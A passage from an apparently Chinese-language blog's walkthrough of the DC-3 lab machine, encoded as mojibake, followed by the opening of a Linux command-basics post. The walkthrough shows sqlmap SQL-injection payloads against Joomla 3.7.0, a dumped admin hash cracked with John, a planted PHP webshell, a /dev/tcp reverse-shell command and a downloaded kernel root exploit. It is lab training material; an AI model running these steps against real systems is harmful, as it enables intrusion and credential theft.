</span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;system&#x2F;       </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;beez3&#x2F;    </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;tmp&#x2F;                                             </span><br><span class="line">[08:45:45] 200 -    2KB - &#x2F;web.config.txt</span><br></pre></td></tr></table></figure>



<p>å› ä¸ºçŸ¥é“CMSæ˜¯joomla</p>
<p>joomscanä¸€æ³¢å‘ç°ç‰ˆæœ¬å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.33.138</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;components</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;modules</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;templates</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;images&#x2F;banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info&#x2F;status files</span><br><span class="line">[++] Readable info&#x2F;status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;                                                                                                       </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Checking robots.txt existing                                                                                                                             </span><br><span class="line">[++] robots.txt is not found                                                                                                                                 </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Finding common backup files name                                                                                                                         </span><br><span class="line">[++] Backup files are not found                                                                                                                              </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Finding common log files name                                                                                                                            </span><br><span class="line">[++] error log is not found                                                                                                                                  </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Checking sensitive config.php.x file                                                                                                                     </span><br><span class="line">[++] Readable config files are not found</span><br></pre></td></tr></table></figure>





<h2 id="sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç "><a href="#sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç " class="headerlink" title="sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç "></a>sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç </h2><p>å‘ç°Joomla3.7.0</p>
<p>æœç´¢ä¸€æ³¢æ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla | grep &quot;3\.7&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Joomla! 3.7 - SQL Injection                                                    | php&#x2F;remote&#x2F;44227.php</span><br><span class="line">Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection                                     | php&#x2F;webapps&#x2F;42033.txt</span><br></pre></td></tr></table></figure>

<p>è¯•äº†ä¸€ä¸‹ç¬¬ä¸€ä¸ªï¼Œå‘ç°å¥½åƒæ— æ³•åˆ©ç”¨ï¼Œæ‰“å¼€ä¸€ä¸‹ç¬¬äºŒä¸ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="line"># Date: 05-19-2017</span><br><span class="line"># Exploit Author: Mateus Lino</span><br><span class="line"># Reference: https:&#x2F;&#x2F;blog.sucuri.net&#x2F;2017&#x2F;05&#x2F;sql-injection-vulnerability-joomla-3-7.html</span><br><span class="line"># Vendor Homepage: https:&#x2F;&#x2F;www.joomla.org&#x2F;</span><br><span class="line"># Version: &#x3D; 3.7.0</span><br><span class="line"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="line"># CVE : - CVE-2017-8917</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(CASE WHEN (1573&#x3D;1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600&#x3D;6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND&#x2F;OR time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT * FROM (SELECT(SLEEP(5)))GDiu)</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¸€ä¸‹sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[09:26:42] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)</span><br><span class="line">web application technology: Apache 2.4.18</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.1</span><br><span class="line">[09:26:43] [INFO] fetching database names</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;joomladb&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;sys&#39;</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">[09:26:43] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2671 times</span><br><span class="line">[09:26:43] [INFO] fetched data logged to text files under &#39;&#x2F;root&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;192.168.33.138&#39;</span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸ªè¡¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb --tables  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      |</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| #__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸€ä¸‹å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸€ä¸‹å…·ä½“å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; -C &#39;username,password&#39; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>



<h2 id="å¯¹hashå¯†ç è¿›è¡Œè§£å¯†"><a href="#å¯¹hashå¯†ç è¿›è¡Œè§£å¯†" class="headerlink" title="å¯¹hashå¯†ç è¿›è¡Œè§£å¯†"></a>å¯¹hashå¯†ç è¿›è¡Œè§£å¯†</h2><p>éœ€è¦å¯¹è¿™ä¸ªhashè¿›è¡Œè§£å¯†ï¼Œå¯ä»¥ä½¿ç”¨Johnå·¥å…·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john dc3.txt		&#x2F;&#x2F;dc3.txtå†…å®¹å°±æ˜¯åˆšæ‰çš„hashå€¼</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¯†ç snoopyï¼ŒæˆåŠŸç™»å½•åˆ°äº†åå°ã€‚</p>
<h2 id="åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬"><a href="#åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬"></a>åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬</h2><p>ä¹‹å‰dirsearchæ‰«ææ‰«åˆ°äº†templatesæ¨¡å—ï¼Œå¹¶ä¸”å‘ç°åå°è¿™ä¸ªåœ°æ–¹å¯ä»¥ä¿®æ”¹æºä»£ç ï¼Œäºæ˜¯æƒ³åˆ°åœ¨index.phpé‡Œæ·»åŠ ä¸€å¥è¯æœ¨é©¬        <img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-2.png" alt="3-2"></p>
<p>ä½†æ˜¯è¿æ¥ä¸ä¸Šï¼Œäºæ˜¯åœ¨è¿™ä¸ªç›®å½•ä¸‹é¢æ–°å»ºäº†ä¸€ä¸ªtest.phpé‡Œé¢å†™äº†ä¸€å¥è¯æœ¨é©¬ï¼Œè€Œä¸”è¿æ¥æˆåŠŸã€‚</p>
<h2 id="åå¼¹bashåˆ°kaliä¸Š"><a href="#åå¼¹bashåˆ°kaliä¸Š" class="headerlink" title="åå¼¹bashåˆ°kaliä¸Š"></a>åå¼¹bashåˆ°kaliä¸Š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2233												&#x2F;&#x2F;åœ¨kaliä¸Šæ‰§è¡Œ</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.33.128ã€kaliçš„ipã€‘&#x2F;2233 0&gt;&amp;1&#39; 		&#x2F;&#x2F;åœ¨èšå‰‘è¿æ¥æœºä¸Šæ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>å…³äºåå¼¹bashçš„åŸç†ï¼Œ<a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176" target="_blank" rel="noopener">å‚è€ƒè¿™ç¯‡</a></p>
<blockquote>
<p>ä¸ºå•¥å¿…é¡»è¦bash -cï¼Ÿï¼Ÿï¼Ÿ</p>
</blockquote>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><blockquote>
<p>æ¥ä¸‹æ¥å°±æ˜¯ææƒéƒ¨åˆ†ï¼Œä½†æ˜¯æŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰å¯æ‰§è¡Œsudoå‘½ä»¤çš„ç”¨æˆ·ï¼Œæ²¡æœ‰suidæƒé™çš„å¯æ‰§è¡Œå‘½ä»¤æˆ–è€…æ–‡ä»¶ï¼Œæ²¡æœ‰å®šæ—¶ä»»åŠ¡ï¼Œæ²¡æœ‰æƒé™æ»¥ç”¨å±é™©æ–‡ä»¶ã€‚ä¸‡ä¸å¾—å·²åªèƒ½è¯•ä¸€ä¸‹å†…æ ¸ææƒäº†ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a:</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a:</span><br><span class="line">Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>



<p>æœç´¢ä¸€ä¸‹Ubuntu16.04ææƒæ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-3.png" alt="3-3"></p>
<p>ç»è¿‡ä¸€ç•ªæ¢ç´¢ï¼Œå‘ç°39772.txtå¯ä»¥åˆ©ç”¨ï¼Œæ‰“å¼€çœ‹ä¸€ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~&#x2F;ebpf_mapfd_doubleput$ .&#x2F;compile.sh</span><br><span class="line">user@host:~&#x2F;ebpf_mapfd_doubleput$ .&#x2F;doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;&#x3D;60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~&#x2F;ebpf_mapfd_doubleput# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https:&#x2F;&#x2F;git.kernel.org&#x2F;cgit&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;commit&#x2F;?id&#x3D;8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;attachment?aid&#x3D;232552</span><br><span class="line">Exploit-DB Mirror: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure>

<p>å…ˆåœ¨kaliæ”»å‡»æœºä¸Šwgetä¸‹æ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸Šä¼ åˆ°æœ¬åœ°æœåŠ¡å™¨ä¸Šã€‚</p>
<blockquote>
<p>è¿™é‡Œå¦‚æœä¸æƒ³ç”¨80ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9999</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç„¶ååœ¨äº¤äº’shellä¸Šwgetä¸‹è½½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.33.128&#x2F;dc3.zip</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹å‡ºç°äº†è¿™æ ·çš„é—®é¢˜</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-4.png" alt="3-4"></p>
<p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æœåŠ¡å™¨ç«¯çš„é—®é¢˜ï¼Œåæ¥å‘ç°æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹æ²¡æœ‰å¯å†™çš„æƒé™ã€‚</p>
<p>æ‰¾äº†ä¸€ä¸ªæœ‰å¯å†™æƒé™çš„ç›®å½•å°±ä¸‹è½½æˆåŠŸäº†ï¼</p>
<p>è§£å‹ä¸€ä¸‹ï¼Œç„¶åå…ˆåæŒ‰ç…§æ•™ç¨‹æ‰§è¡Œä¸¤ä¸ªè„šæœ¬å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-5.png" alt="3-5"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/21/linux100%E8%AE%B2/">linux100è®²</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-21</time><div class="content"><h2 id="å¦‚ä½•ä½¿ç”¨å‘½ä»¤"><a href="#å¦‚ä½•ä½¿ç”¨å‘½ä»¤" class="headerlink" title="å¦‚ä½•ä½¿ç”¨å‘½ä»¤"></a>å¦‚ä½•ä½¿ç”¨å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man 5 passwd		&#x2F;&#x2F;passwdæ–‡ä»¶çš„ä½œç”¨</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls --help			&#x2F;&#x2F;ç®€ç•¥æ•™ç¨‹</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info ls 			&#x2F;&#x2F;ç¨å¾®è¯¦ç»†çš„æ•™ç¨‹</span><br></pre></td></tr></table></figure>



